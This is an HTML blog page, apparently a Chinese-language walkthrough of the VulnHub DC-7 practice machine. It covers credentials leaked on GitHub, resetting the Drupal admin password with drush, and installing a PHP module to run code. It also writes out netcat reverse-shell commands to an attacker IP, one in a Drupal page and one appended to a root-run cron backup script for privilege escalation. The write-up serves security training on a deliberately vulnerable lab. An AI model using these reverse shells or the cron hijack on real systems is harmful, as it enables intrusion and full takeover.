@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="1.搜寻信息一开始的nmap、dirsearch找出来的没有用，后看提示才发现是git源码泄露 https:&#x2F;&#x2F;github.com&#x2F;Dc7User&#x2F;staffdb&#x2F;blob&#x2F;master&#x2F;config.php先去github上找到这个密码 1234567&lt;?php	$servername &#x3D; &quot;localhost&quot;;	$username &#x3D; &quot;dc7user&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC7">
+<meta property="og:url" content="https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/index.html">
+<meta property="og:site_name" content="zhaochoudecat">
+<meta property="og:description" content="1.搜寻信息一开始的nmap、dirsearch找出来的没有用，后看提示才发现是git源码泄露 https:&#x2F;&#x2F;github.com&#x2F;Dc7User&#x2F;staffdb&#x2F;blob&#x2F;master&#x2F;config.php先去github上找到这个密码 1234567&lt;?php	$servername &#x3D; &quot;localhost&quot;;	$username &#x3D; &quot;dc7user&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114210849.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114195605.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114201043.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114202552.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114202826.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114203659.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114204752.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114204649.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114205405.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114210052.png">
+<meta property="og:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114211751.png">
+<meta property="article:published_time" content="2026-05-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-02T16:56:09.163Z">
+<meta property="article:author" content="zhaochoudecat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhaochoudecat.github.io/assets/DC7/Pasted%20image%2020260114210849.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>DC7</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC9/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&text=DC7"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&is_video=false&description=DC7"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DC7&body=Check out this article: https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&title=DC7"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/05/02/%E9%9D%B6%E6%9C%BA/vulnhub/DC/DC7/&name=DC7&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%90%9C%E5%AF%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1.搜寻信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95ssh"><span class="toc-number">2.</span> <span class="toc-text">2.登录ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%99%BB%E5%BD%95%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.</span> <span class="toc-text">3.登录管理员</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DC7
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zhaochoudecat</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-05-01T16:00:00.000Z" itemprop="datePublished">2026-05-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="1-搜寻信息"><a href="#1-搜寻信息" class="headerlink" title="1.搜寻信息"></a>1.搜寻信息</h2><p>一开始的<code>nmap</code>、<code>dirsearch</code>找出来的没有用，后看提示才发现是<code>git源码泄露</code><br><img src="/assets/DC7/Pasted%20image%2020260114210849.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dc7User/staffdb/blob/master/config.php">https://github.com/Dc7User/staffdb/blob/master/config.php</a><br>先去<code>github</code>上找到这个密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现登录不上，那就转换思路，尝试<code>ssh</code><br><img src="/assets/DC7/Pasted%20image%2020260114195605.png"></p>
+<h2 id="2-登录ssh"><a href="#2-登录ssh" class="headerlink" title="2.登录ssh"></a>2.登录ssh</h2><p><strong>提权</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">-bash: <span class="built_in">sudo</span>: <span class="built_in">command</span> not found</span><br><span class="line">dc7user@dc-7:~$ <span class="built_in">ls</span></span><br><span class="line">backups  mbox</span><br><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> mbox </span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:00:22 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-<span class="built_in">date</span>: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        <span class="built_in">id</span> 1i3EPu-0000CV-5C</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of <span class="string">&#x27;/home/dc7user/backups/website.tar.gz&#x27;</span> failed: File exists</span><br><span class="line">gpg: symmetric encryption of <span class="string">&#x27;/home/dc7user/backups/website.sql&#x27;</span> failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:15:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-<span class="built_in">date</span>: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        <span class="built_in">id</span> 1i3EeF-0000Dx-G1</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3EeF-0000Dx-G1@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:15:11 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line">gpg: symmetric encryption of <span class="string">&#x27;/home/dc7user/backups/website.tar.gz&#x27;</span> failed: File exists</span><br><span class="line">gpg: symmetric encryption of <span class="string">&#x27;/home/dc7user/backups/website.sql&#x27;</span> failed: File exists</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Aug 29 17:30:11 2019</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-<span class="built_in">date</span>: Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">Received: from root by dc-7 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        <span class="built_in">id</span> 1i3Esl-0000Ec-JQ</span><br><span class="line">        <span class="keyword">for</span> root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1i3Esl-0000Ec-JQ@dc-7&gt;</span><br><span class="line">Date: Thu, 29 Aug 2019 17:30:11 +1000</span><br></pre></td></tr></table></figure>
+<p>发现每15分钟执行一次定时任务 <code>/opt/scripts/backups.sh</code></p>
+<p>查看下定时任务的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line"></span><br><span class="line">dc7user@dc-7:~$ <span class="built_in">ls</span> -l /opt/scripts/backups.sh</span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><code>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</code><br>可以看到当前的<code>dc7user</code> 用户属于other group , 无 <code>x</code> 写权限，无法写入<code>nc</code>脚本，因此需要网页写入</p>
+<p>寻找有<code>root</code>权限的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ find / -user root -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line"></span><br><span class="line">dc7user@dc-7:~$ /usr/sbin/exim4 --version</span><br><span class="line">Exim version 4.89 <span class="comment">#2 built 20-Jul-2019 11:32:35</span></span><br><span class="line">Copyright (c) University of Cambridge, 1995 - 2017</span><br><span class="line">(c) The Exim Maintainers and contributors <span class="keyword">in</span> ACKNOWLEDGMENTS file, 2007 - 2017</span><br><span class="line">Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)</span><br><span class="line">Support <span class="keyword">for</span>: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open</span><br><span class="line">Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd</span><br><span class="line">Authenticators: cram_md5 plaintext</span><br><span class="line">Routers: accept dnslookup ipliteral manualroute queryprogram redirect</span><br><span class="line">Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp</span><br><span class="line">Fixed never_users: 0</span><br><span class="line">Configure owner: 0:0</span><br><span class="line">Size of off_t: 8</span><br><span class="line">Configuration file is /var/lib/exim4/config.autogenerated</span><br></pre></td></tr></table></figure>
+
+<p>参考<code>DC8</code>的方案，尝试<code>exim4</code>提权&#x3D;&#x3D;&gt; <em>失败</em><br><img src="/assets/DC7/Pasted%20image%2020260114201043.png"></p>
+<p>继续查找有用的信息，发现<code>.drush</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">ls</span> -la</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 5 dc7user dc7user 4096 Jan 14 22:10 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 Aug 29  2019 ..</span><br><span class="line">-rw-r--r-- 1 dc7user dc7user 3552 Jan 12 22:34 a.sh</span><br><span class="line">drwxr-xr-x 2 dc7user dc7user 4096 Jan 14 22:00 backups</span><br><span class="line">lrwxrwxrwx 1 dc7user dc7user    9 Aug 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 dc7user dc7user  220 Aug 29  2019 .bash_logout</span><br><span class="line">-rw-r--r-- 1 dc7user dc7user 3953 Aug 29  2019 .bashrc</span><br><span class="line">drwxr-xr-x 3 dc7user dc7user 4096 Aug 29  2019 .drush</span><br><span class="line">drwx------ 3 dc7user dc7user 4096 Jan 14 22:00 .gnupg</span><br><span class="line">-rw------- 1 dc7user dc7user 7938 Aug 30  2019 mbox</span><br><span class="line">-rw-r--r-- 1 dc7user dc7user  675 Aug 29  2019 .profile</span><br></pre></td></tr></table></figure>
+
+<p><strong>Drush</strong>（Drupal Shell）是 Drupal 内容管理系统的<strong>命令行工具与脚本接口</strong>，被称为 Drupal 开发者的 “瑞士军刀”。它由 Moshe Weitzman 于 2006 年创建，旨在通过命令行界面简化 Drupal 站点的安装、开发、调试与维护工作，大幅提升效率并减少通过 Web 界面操作可能产生的错误。</p>
+<p>Drush 可以直接访问 Drupal 核心功能和 API，无需通过网站前端，支持自动化脚本编写，实现重复性任务的批量处理。官方文档位于 <a target="_blank" rel="noopener" href="https://www.drush.org/latest/">drush.org</a>。</p>
+<blockquote>
+<p>[!Success] drush用户管理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drush user-create admin --password=&quot;securepass&quot; # 创建管理员用户 </span><br><span class="line">drush user-password admin --password=&quot;newpass&quot; # 重置用户密码 </span><br><span class="line">drush user-login # 生成一次性登录链接</span><br></pre></td></tr></table></figure></blockquote>
+<p>利用<code>drush</code>修改密码，这里一定要注意在<code>/var/www/html/</code>目录下执行才可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~/.drush$ cd /var/www/html/</span><br><span class="line">dc7user@dc-7:/var/www/html$ drush user-password admin --password=&quot;123456&quot;</span><br><span class="line">Changed password for admin </span><br></pre></td></tr></table></figure>
+<p>这里管理员用户名为： <code>admin</code>  密码为：<code>123456</code></p>
+<h2 id="3-登录管理员"><a href="#3-登录管理员" class="headerlink" title="3.登录管理员"></a>3.登录管理员</h2><p><img src="/assets/DC7/Pasted%20image%2020260114202552.png"></p>
+<p>这里发现没法选择<code>php</code>代码执行，需要自己安装<br><a target="_blank" rel="noopener" href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a></p>
+<p>选择<code>extend</code>进行安装<code>php</code>插件<br><img src="/assets/DC7/Pasted%20image%2020260114202826.png"><br>安装完成之后记得勾选<code>php</code>，然后点击最下面的<code>install</code><br><img src="/assets/DC7/Pasted%20image%2020260114203659.png"><br>选择<code>content</code>,编辑内容<br><img src="/assets/DC7/Pasted%20image%2020260114204752.png"><br>写入<code>nc</code>脚本<br><img src="/assets/DC7/Pasted%20image%2020260114204649.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/bash 192.168.3.48 1111&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>进入<code>nc</code>反弹脚本，&#x3D;&#x3D;nc的命令是谁执行反弹谁的权限&#x3D;&#x3D;，因此再次写入一个<code>nc</code>脚本至定时任务<code>/opt/scripts/backups.sh</code>,目的是让<code>root</code>执行，获取<code>root</code>的权限</p>
+<p><strong>进入<code>nc</code>后创建一个伪终端，提高命令窗口交互</strong><br><strong><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)</code></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-7:/var/www/html$ <span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.3.48 2222&quot;</span> &gt;&gt; /opt/scripts/backups.sh</span><br><span class="line">&lt;/bash 192.168.3.48 2222<span class="string">&quot; &gt;&gt; /opt/scripts/backups.sh</span></span><br><span class="line"><span class="string">www-data@dc-7:/var/www/html$ cat /opt/scripts/backups.sh</span></span><br><span class="line"><span class="string">cat /opt/scripts/backups.sh</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">rm /home/dc7user/backups/*</span></span><br><span class="line"><span class="string">cd /var/www/html/</span></span><br><span class="line"><span class="string">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span></span><br><span class="line"><span class="string">cd ..</span></span><br><span class="line"><span class="string">tar -czf /home/dc7user/backups/website.tar.gz html/</span></span><br><span class="line"><span class="string">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span></span><br><span class="line"><span class="string">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span></span><br><span class="line"><span class="string">chown dc7user:dc7user /home/dc7user/backups/*</span></span><br><span class="line"><span class="string">rm /home/dc7user/backups/website.sql</span></span><br><span class="line"><span class="string">rm /home/dc7user/backups/website.tar.gz</span></span><br><span class="line"><span class="string">nc -e /bin/bash 192.168.3.48 2222</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来可以手动执行一下脚本测试，发现反弹的还是<code>user</code>权限，验证了&#x3D;&#x3D;nc的命令是谁执行反弹谁的权限&#x3D;&#x3D;<br><img src="/assets/DC7/Pasted%20image%2020260114205405.png"></p>
+<p>等待定时任务自动执行成功获得<code>root</code>权限<br><img src="/assets/DC7/Pasted%20image%2020260114210052.png"></p>
